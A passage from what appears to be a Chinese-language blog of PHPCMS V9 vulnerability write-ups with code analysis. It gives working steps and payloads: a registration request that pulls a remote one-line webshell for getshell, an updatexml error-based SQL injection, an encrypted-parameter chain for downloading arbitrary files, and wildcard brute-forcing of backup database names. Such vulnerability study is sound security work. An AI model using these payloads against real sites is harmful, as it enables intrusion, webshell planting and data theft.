operator">></span><span class="token property">uid</span> <span class="token operator">/</span> <span class="token number">10000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$dir2</span> <span class="token operator">=</span> <span class="token function">ceil</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">uid</span> <span class="token operator">%</span> <span class="token number">10000</span> <span class="token operator">/</span> <span class="token number">1000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token comment" spellcheck="true">//创建图片存储文件夹</span>        <span class="token variable">$avatarfile</span> <span class="token operator">=</span> pc_base<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">load_config</span><span class="token punctuation">(</span><span class="token string">'system'</span><span class="token punctuation">,</span> <span class="token string">'upload_path'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">'avatar/'</span><span class="token punctuation">;</span>        <span class="token variable">$dir</span> <span class="token operator">=</span> <span class="token variable">$avatarfile</span><span class="token punctuation">.</span><span class="token variable">$dir1</span><span class="token punctuation">.</span><span class="token string">'/'</span><span class="token punctuation">.</span><span class="token variable">$dir2</span><span class="token punctuation">.</span><span class="token string">'/'</span><span class="token punctuation">.</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">uid</span><span class="token punctuation">.</span><span class="token string">'/'</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token variable">$dir</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token function">mkdir</span><span class="token punctuation">(</span><span class="token variable">$dir</span><span class="token punctuation">,</span> <span class="token number">0777</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>                <span class="token comment" spellcheck="true">//存储flashpost图片</span>        <span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token variable">$dir</span><span class="token punctuation">.</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">uid</span><span class="token punctuation">.</span><span class="token string">'.zip'</span><span class="token punctuation">;</span>        <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">avatardata</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token comment" spellcheck="true">//解压缩文件</span>        pc_base<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">load_app_class</span><span class="token punctuation">(</span><span class="token string">'pclzip'</span><span class="token punctuation">,</span> <span class="token string">'phpsso'</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$archive</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">PclZip</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$archive</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">extract</span><span class="token punctuation">(</span><span class="token constant">PCLZIP_OPT_PATH</span><span class="token punctuation">,</span> <span class="token variable">$dir</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"Error : "</span><span class="token punctuation">.</span><span class="token variable">$archive</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">errorInfo</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>                <span class="token comment" spellcheck="true">//判断文件安全，删除压缩包和非jpg图片</span>        <span class="token variable">$avatararr</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">'180x180.jpg'</span><span class="token punctuation">,</span> <span class="token string">'30x30.jpg'</span><span class="token punctuation">,</span> <span class="token string">'45x45.jpg'</span><span class="token punctuation">,</span> <span class="token string">'90x90.jpg'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$handle</span> <span class="token operator">=</span> <span class="token function">opendir</span><span class="token punctuation">(</span><span class="token variable">$dir</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token boolean">false</span> <span class="token operator">!==</span> <span class="token punctuation">(</span><span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">readdir</span><span class="token punctuation">(</span><span class="token variable">$handle</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$file</span> <span class="token operator">!==</span> <span class="token string">'.'</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$file</span> <span class="token operator">!==</span> <span class="token string">'..'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">,</span> <span class="token variable">$avatararr</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                        @<span class="token function">unlink</span><span class="token punctuation">(</span><span class="token variable">$dir</span><span class="token punctuation">.</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//删除非jpg文件</span>                    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>                        <span class="token variable">$info</span> <span class="token operator">=</span> @<span class="token function">getimagesize</span><span class="token punctuation">(</span><span class="token variable">$dir</span><span class="token punctuation">.</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$info</span> <span class="token operator">||</span> <span class="token variable">$info</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">!=</span><span class="token number">2</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                            @<span class="token function">unlink</span><span class="token punctuation">(</span><span class="token variable">$dir</span><span class="token punctuation">.</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                        <span class="token punctuation">}</span>                    <span class="token punctuation">}</span>                <span class="token punctuation">}</span>            <span class="token punctuation">}</span>            <span class="token function">closedir</span><span class="token punctuation">(</span><span class="token variable">$handle</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">db</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">update</span><span class="token punctuation">(</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">'avatar'</span><span class="token operator">=</span><span class="token operator">></span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">'uid'</span><span class="token operator">=</span><span class="token operator">></span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">uid</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">exit</span><span class="token punctuation">(</span><span class="token string">'1'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="3、漏洞修复"><a href="#3、漏洞修复" class="headerlink" title="3、漏洞修复"></a>3、漏洞修复</h2><p>使用递归判断文件，或者删除目录文件。</p><h1 id="PHPCMS-V9-6-0任意文件上传漏洞"><a href="#PHPCMS-V9-6-0任意文件上传漏洞" class="headerlink" title="PHPCMS V9.6.0任意文件上传漏洞"></a>PHPCMS V9.6.0任意文件上传漏洞</h1><h2 id="1、漏洞利用-1"><a href="#1、漏洞利用-1" class="headerlink" title="1、漏洞利用"></a>1、漏洞利用</h2><p>注册页面：<a href="http://www.cms.com/index.php?m=member&amp;c=index&amp;a=register&amp;siteid=1">http://www.cms.com/index.php?m=member&amp;c=index&amp;a=register&amp;siteid=1</a></p><p>抓到的数据包：</p><pre class="line-numbers language-http"><code class="language-http">POST /index.php?m=member&amp;c=index&amp;a=register&amp;siteid=1 HTTP/1.1<span class="token header-name keyword">Host:</span> www.cms.com<span class="token header-name keyword">Content-Length:</span> 267<span class="token header-name keyword">Cache-Control:</span> max-age=0<span class="token header-name keyword">Upgrade-Insecure-Requests:</span> 1<span class="token header-name keyword">Origin:</span> http://www.cms.com<span class="token header-name keyword">Content-Type:</span> application/x-www-form-urlencoded<span class="token header-name keyword">User-Agent:</span> Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36<span class="token header-name keyword">Accept:</span> text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9<span class="token header-name keyword">Referer:</span> http://www.cms.com/index.php?m=member&amp;c=index&amp;a=register&amp;siteid=1<span class="token header-name keyword">Accept-Language:</span> zh-CN,zh;q=0.9<span class="token header-name keyword">Cookie:</span> RHqSL_admin_username=ece6Gnurggb838uGIzRtCPle-xzKrCJnZem_4d-jHrokSQ; RHqSL_siteid=d3d9eKX-JD3eFybE1cFV46oUnelYFazCV8yhke5x; RHqSL_userid=89beTndPQpndZXybs4_2FKjzPL3fU7HDkDSimF2G;<span class="token header-name keyword">Connection:</span> closesiteid=1&amp;modelid=10&amp;username=asdasd&amp;password=123123&amp;pwdconfirm=123123&amp;email=genva22na%40genvana.com&amp;nickname=121aa3123&amp;info%5Bbirthday%5D=2023-02-08&amp;dosubmit=%E5%90%8C%E6%84%8F%E6%B3%A8%E5%86%8C%E5%8D%8F%E8%AE%AE%EF%BC%8C%E6%8F%90%E4%BA%A4%E6%B3%A8%E5%86%8C&amp;protocol=<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>POC:</p><p>把post请求修改成如下：</p><pre class="line-numbers language-url"><code class="language-url">siteid=1&modelid=11&username=bb2449&password=123456&email=gyar1113@qq.com&info[content]=<img src=http://www.baidu.com?.php#.jpg>&dosubmit=1&protocol=<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>其中src后的网址为一句话文本，把注册时候抓的包POST数据修改即可getShell</p><h2 id="2、漏洞分析-1"><a href="#2、漏洞分析-1" class="headerlink" title="2、漏洞分析"></a>2、漏洞分析</h2><p>注册的时候，modelid应该是10</p><p><img src="https://hexo-images1.oss-cn-beijing.aliyuncs.com/imgs/image-20230208105342039.png" alt="image-20230208105342039"></p><p>注册时候先把除了生日之外的数据插入数据库，然后加载模型，调用对应的函数，把对应字段插入。</p><p><img src="https://hexo-images1.oss-cn-beijing.aliyuncs.com/imgs/image-20230210215213696.png" alt="image-20230210215213696"></p><p><img src="https://hexo-images1.oss-cn-beijing.aliyuncs.com/imgs/image-20230210215551641.png" alt="image-20230210215551641"></p><h1 id="PHPCMS-V9-6-0注入漏洞"><a href="#PHPCMS-V9-6-0注入漏洞" class="headerlink" title="PHPCMS V9.6.0注入漏洞"></a>PHPCMS V9.6.0注入漏洞</h1><h2 id="1、漏洞利用-2"><a href="#1、漏洞利用-2" class="headerlink" title="1、漏洞利用"></a>1、漏洞利用</h2><p>需要登录有管理员的cookie</p><h4 id="1-1-直接访问站点：-x2F-index-php-m-x3D-wap-amp-c-x3D-index-amp-siteid-x3D-1"><a href="#1-1-直接访问站点：-x2F-index-php-m-x3D-wap-amp-c-x3D-index-amp-siteid-x3D-1" class="headerlink" title="1.1 直接访问站点： /index.php?m=wap&amp;c=index&amp;siteid=1"></a>1.1 直接访问站点： /index.php?m=wap&amp;c=index&amp;siteid=1</h4><p>抓包，获取返回的cookie</p><p><code>QcnnO_siteid=7d18JRT-OQxmc_R0qaKYIh0ZoCudZtWwQtgSPjrp</code></p><p><img src="https://hexo-images1.oss-cn-beijing.aliyuncs.com/imgs/image-20230212094640978.png" alt="image-20230212094640978"></p><h4 id="1-2POST请求"><a href="#1-2POST请求" class="headerlink" title="1.2POST请求"></a>1.2POST请求</h4><p>/index.php?m=attachment&amp;c=attachments&amp;a=swfupload_json&amp;aid=1&amp;src=%26id=%*27%20and%20updatexml%281%2Cconcat%281%2C%28user%28%29%29%29%2C1%29%23%26m%3D1%26f%3Dhaha%26modelid%3D2%26catid%3D7%26</p><p>在POST数据中添加：userid_flash=xxxx</p><p><img src="https://hexo-images1.oss-cn-beijing.aliyuncs.com/imgs/image-20230212095635618.png" alt="image-20230212095635618"></p><p>若不能正常返回，则添加:</p><pre class="line-numbers language-http"><code class="language-http"><span class="token header-name keyword">content-Type:</span>application/x-www-form-urlencoded<span class="token header-name keyword">content-Length:</span>53<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>得到</p><pre class="line-numbers language-php"><code class="language-php">QcnnO_att_json<span class="token operator">=</span>737bEw<span class="token operator">-</span>iEXGFwMINJ4E4BJUulrlOlYwbJ7hv5tYUjtWI0rXIXa8cUsPZJi8qhE9p7Lbke6efBYb3I7TUsqi9qfPYh4M<span class="token operator">-</span>Hv1oxRFFVzFLj5WMi4s2tO1xJivSkrLEivBAN9lIYupRY_YJjfs<span class="token operator">-</span><span class="token constant">T3Z4S</span><span class="token operator">-</span>OWHSzjDmQQ4EaAqyMVc<span class="token operator">-</span>GtHDQkUckVr5w<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="1-3-再次POST得到报错信息"><a href="#1-3-再次POST得到报错信息" class="headerlink" title="1.3 再次POST得到报错信息"></a>1.3 再次POST得到报错信息</h4><p>/index.php?m=content&amp;c=down&amp;a_k={QcnnO_att_json}</p><p><img src="https://hexo-images1.oss-cn-beijing.aliyuncs.com/imgs/image-20230212103225477.png" alt="image-20230212103225477"></p><h2 id="2-漏洞分析"><a href="#2-漏洞分析" class="headerlink" title="2.漏洞分析"></a>2.漏洞分析</h2><h4 id="1-获取加密的cookie"><a href="#1-获取加密的cookie" class="headerlink" title="1.获取加密的cookie:"></a>1.获取加密的cookie:</h4><p><img src="https://hexo-images1.oss-cn-beijing.aliyuncs.com/imgs/image-20230212105535176.png" alt="image-20230212105535176"></p><h4 id="2-报错注入"><a href="#2-报错注入" class="headerlink" title="2.报错注入"></a>2.报错注入</h4><pre class="line-numbers language-html"><code class="language-html">POST /index.php?m=attachment&amp;c=attachments&amp;a=swfupload_json&amp;aid=1&amp;src=%26id=%*27%20and%20updatexml%281%2Cconcat%281%2C%28user%28%29%29%29%2C1%29%23%26m%3D1%26f%3Dhaha%26modelid%3D2%26catid%3D7%26&amp;src =  &amp;id=%*27 and updatexml(1,concat(1,(user())),1)#&amp;m=1&amp;f=haha&amp;modelid=2&amp;catid=7&amp;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-php"><code class="language-php"><span class="token variable">$arr</span><span class="token punctuation">[</span><span class="token string">'src'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">safe_replace</span><span class="token punctuation">(</span><span class="token function">trim</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'src'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment" spellcheck="true">//src="xxx"</span><span class="token keyword">function</span> <span class="token function">safe_replace</span><span class="token punctuation">(</span><span class="token variable">$string</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token variable">$string</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">'%20'</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token variable">$string</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$string</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">'%27'</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token variable">$string</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$string</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">'%2527'</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token variable">$string</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$string</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">'*'</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token variable">$string</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$string</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">'"'</span><span class="token punctuation">,</span><span class="token string">'&amp;quot;'</span><span class="token punctuation">,</span><span class="token variable">$string</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$string</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">"'"</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token variable">$string</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$string</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">'"'</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token variable">$string</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$string</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">';'</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token variable">$string</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$string</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">'&lt;'</span><span class="token punctuation">,</span><span class="token string">'&amp;lt;'</span><span class="token punctuation">,</span><span class="token variable">$string</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$string</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">'>'</span><span class="token punctuation">,</span><span class="token string">'&amp;gt;'</span><span class="token punctuation">,</span><span class="token variable">$string</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$string</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">"{"</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token variable">$string</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$string</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">'}'</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token variable">$string</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$string</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">'\\'</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token variable">$string</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token variable">$string</span><span class="token punctuation">;</span><span class="token punctuation">}</span>过滤之后的<span class="token punctuation">:</span>src <span class="token operator">=</span>  <span class="token operator">&amp;</span>id<span class="token operator">=</span>  ' <span class="token keyword">and</span> <span class="token function">updatexml</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token function">concat</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token function">user</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token shell-comment comment">#   &amp;m=1&amp;f=haha&amp;modelid=2&amp;catid=7&amp;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="3-x2F-index-php-m-x3D-content-amp-c-x3D-down-amp-a-k-x3D-QcnnO-att-json"><a href="#3-x2F-index-php-m-x3D-content-amp-c-x3D-down-amp-a-k-x3D-QcnnO-att-json" class="headerlink" title="3./index.php?m=content&amp;c=down&amp;a_k={QcnnO_att_json}"></a>3./index.php?m=content&amp;c=down&amp;a_k={QcnnO_att_json}</h4><p><img src="https://hexo-images1.oss-cn-beijing.aliyuncs.com/imgs/image-20230212110541511.png" alt="image-20230212110541511"></p><h1 id="PHPCMS-V9-6-1任意文件下载漏洞"><a href="#PHPCMS-V9-6-1任意文件下载漏洞" class="headerlink" title="PHPCMS V9.6.1任意文件下载漏洞"></a>PHPCMS V9.6.1任意文件下载漏洞</h1><h2 id="1、漏洞利用-3"><a href="#1、漏洞利用-3" class="headerlink" title="1、漏洞利用"></a>1、漏洞利用</h2><h4 id="1-1：-获取加密cookie"><a href="#1-1：-获取加密cookie" class="headerlink" title="1.1： 获取加密cookie"></a>1.1： 获取加密cookie</h4><p>访问：/index.php?m=wap&amp;c=index&amp;siteid=1 ，得到</p><p><img src="https://hexo-images1.oss-cn-beijing.aliyuncs.com/imgs/image-20230213102655863.png" alt="image-20230213102655863"></p><p>UpefV_siteid=28adM578er-6hxxjkAT5ivqVOcQ7e0vHhBm0uwXL</p><h4 id="1-2：-请求下载文件"><a href="#1-2：-请求下载文件" class="headerlink" title="1.2： 请求下载文件"></a>1.2： 请求下载文件</h4><p>这一步是输入get请求的参数，后端对参数进行加密，然后得到改加密后的字符串。</p><p>/index.php?m=attachment&amp;c=attachments&amp;a=swfupload_json&amp;aid=1&amp;src=pad%3Dx%26i%3D1%26modelid%3D1%26catid%3D1%26d%3D1%26m%3D1%26s%3Dindex%26f%3D.p%25253chp</p><p>把数据报修改为POST，</p><p>添加数据：userid_flash=xxxx</p><p><img src="https://hexo-images1.oss-cn-beijing.aliyuncs.com/imgs/image-20230213103350906.png" alt="image-20230213103350906"></p><pre><code>UpefV_att_json=d74bwkKIug4Fjzu427QkkkmnmzpWhXbPYsi1dBPCxwtXPbp7W_d5G0fELZqSLdbLMlAcu22yvLxKXZvROFxwOZ2OOibV5Q5g2vyTEZqJZjQyQJpxKYeEir1RPtARO6p-2EfwopWVXS59oE3uL9hWFg74zKs</code></pre><h4 id="1-3：下载任意文件"><a href="#1-3：下载任意文件" class="headerlink" title="1.3：下载任意文件"></a>1.3：下载任意文件</h4><p>通过上一步得到的数据，可以下载该文件</p><p>/index.php?m=content&amp;c=down&amp;a=init&amp;a_k=d74bwkKIug4Fjzu427QkkkmnmzpWhXbPYsi1dBPCxwtXPbp7W_d5G0fELZqSLdbLMlAcu22yvLxKXZvROFxwOZ2OOibV5Q5g2vyTEZqJZjQyQJpxKYeEir1RPtARO6p-2EfwopWVXS59oE3uL9hWFg74zKs</p><p><img src="https://hexo-images1.oss-cn-beijing.aliyuncs.com/imgs/image-20230213104353204.png" alt="image-20230213104353204"></p><h2 id="2、漏洞分析-2"><a href="#2、漏洞分析-2" class="headerlink" title="2、漏洞分析"></a>2、漏洞分析</h2><p>对a&amp;k解密后，下载文件</p><pre class="line-numbers language-php"><code class="language-php"><span class="token shell-comment comment">#下载index.php</span><span class="token operator">/</span>index<span class="token punctuation">.</span>php<span class="token operator">?</span>m<span class="token operator">=</span>attachment<span class="token operator">&amp;</span>c<span class="token operator">=</span>attachments<span class="token operator">&amp;</span>a<span class="token operator">=</span>swfupload_json<span class="token operator">&amp;</span>aid<span class="token operator">=</span><span class="token number">1</span><span class="token operator">&amp;</span>src<span class="token operator">=</span>pad<span class="token operator">%</span>3Dx<span class="token operator">%</span>26i<span class="token operator">%</span><span class="token constant">3D1</span><span class="token operator">%</span>26modelid<span class="token operator">%</span><span class="token constant">3D1</span><span class="token operator">%</span>26catid<span class="token operator">%</span><span class="token constant">3D1</span><span class="token operator">%</span>26d<span class="token operator">%</span><span class="token constant">3D1</span><span class="token operator">%</span>26m<span class="token operator">%</span><span class="token constant">3D1</span><span class="token operator">%</span>26s<span class="token operator">%</span>3Dindex<span class="token operator">%</span>26f<span class="token operator">%</span><span class="token constant">3D</span><span class="token punctuation">.</span>p<span class="token operator">%</span>25253chp<span class="token operator">/</span>index<span class="token punctuation">.</span>php<span class="token operator">?</span>m<span class="token operator">=</span>attachment<span class="token operator">&amp;</span>c<span class="token operator">=</span>attachments<span class="token operator">&amp;</span>a<span class="token operator">=</span>swfupload_json<span class="token operator">&amp;</span>aid<span class="token operator">=</span><span class="token number">1</span><span class="token operator">&amp;</span>src<span class="token operator">=</span>pad<span class="token operator">=</span>x<span class="token operator">&amp;</span>i<span class="token operator">=</span><span class="token number">1</span><span class="token operator">&amp;</span>modelid<span class="token operator">=</span><span class="token number">1</span><span class="token operator">&amp;</span>catid<span class="token operator">=</span><span class="token number">1</span><span class="token operator">&amp;</span>d<span class="token operator">=</span><span class="token number">1</span><span class="token operator">&amp;</span>m<span class="token operator">=</span><span class="token number">1</span><span class="token operator">&amp;</span>s<span class="token operator">=</span>index<span class="token operator">&amp;</span>f<span class="token operator">=</span><span class="token punctuation">.</span>p<span class="token operator">%</span>253chp<span class="token operator">%</span>253c  <span class="token operator">==</span><span class="token operator">></span> <span class="token operator">%</span>3c   <span class="token operator">==</span><span class="token operator">></span> <span class="token markup">&lt;$fileurl = str_replace(array('<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>','</span><span class="token punctuation">></span></span></span><span class="token string">'), '</span>'<span class="token punctuation">,</span><span class="token variable">$fileurl</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">.</span>php        <span class="token shell-comment comment">#下载base.php</span><span class="token operator">/</span>index<span class="token punctuation">.</span>php<span class="token operator">?</span>m<span class="token operator">=</span>attachment<span class="token operator">&amp;</span>c<span class="token operator">=</span>attachments<span class="token operator">&amp;</span>a<span class="token operator">=</span>swfupload_json<span class="token operator">&amp;</span>aid<span class="token operator">=</span><span class="token number">1</span><span class="token operator">&amp;</span>src<span class="token operator">=</span>pad<span class="token operator">=</span>x<span class="token operator">&amp;</span>i<span class="token operator">=</span><span class="token number">1</span><span class="token operator">&amp;</span>modelid<span class="token operator">=</span><span class="token number">1</span><span class="token operator">&amp;</span>catid<span class="token operator">=</span><span class="token number">1</span><span class="token operator">&amp;</span>d<span class="token operator">=</span><span class="token number">1</span><span class="token operator">&amp;</span>m<span class="token operator">=</span><span class="token number">1</span><span class="token operator">&amp;</span>s<span class="token operator">=</span><span class="token punctuation">.</span><span class="token operator">/</span>phpcms<span class="token operator">/</span>base<span class="token operator">&amp;</span>f<span class="token operator">=</span><span class="token punctuation">.</span>p<span class="token operator">%</span>253chp<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="PHPCMS-V9-暴力猜解备份数据库文件名"><a href="#PHPCMS-V9-暴力猜解备份数据库文件名" class="headerlink" title="PHPCMS V9 暴力猜解备份数据库文件名"></a>PHPCMS V9 暴力猜解备份数据库文件名</h1><h2 id="1、漏洞利用-4"><a href="#1、漏洞利用-4" class="headerlink" title="1、漏洞利用"></a>1、漏洞利用</h2><p><img src="https://hexo-images1.oss-cn-beijing.aliyuncs.com/imgs/image-20230213115536653.png" alt="image-20230213115536653"></p><p>phpcm后台可以备份数据库内容，在默认情况下，可以直接下载，但是不知道备份的文件名，因此可以使用爆破的方法获取文件名。</p><p><img src="https://hexo-images1.oss-cn-beijing.aliyuncs.com/imgs/image-20230213115655078.png" alt="image-20230213115655078"></p><p><img src="https://hexo-images1.oss-cn-beijing.aliyuncs.com/imgs/image-20230213120303140.png" alt="image-20230213120303140"></p><pre class="line-numbers language-php"><code class="language-php">windows的FindFirstFile（<span class="token constant">API</span><span class="token punctuation">)</span>有个特性就是可以把<span class="token operator">&lt;</span><span class="token operator">&lt;</span>当成通配符来用而<span class="token constant">PHP</span>的<span class="token function">opendir</span><span class="token punctuation">(</span>win32readdir<span class="token punctuation">.</span>c<span class="token punctuation">)</span>就使用了该<span class="token constant">API</span>。<span class="token constant">PHP</span>的文件操作函数均调用了opendir<span class="token punctuation">,</span>所以file_exists也有此特性。1ttoxzt372qluhh26q6e_db_20190429_1<span class="token punctuation">.</span>sqlfile_exists <span class="token operator">--</span><span class="token operator">-</span> opendir  <span class="token operator">--</span> FindFirstFile <span class="token operator">--</span> <span class="token operator">&lt;</span><span class="token operator">&lt;</span>  通配符file_exists  <span class="token operator">-</span> <span class="token operator">&lt;</span><span class="token operator">&lt;</span>  通配符333xxxx<span class="token punctuation">.</span>sql<span class="token number">3</span><span class="token 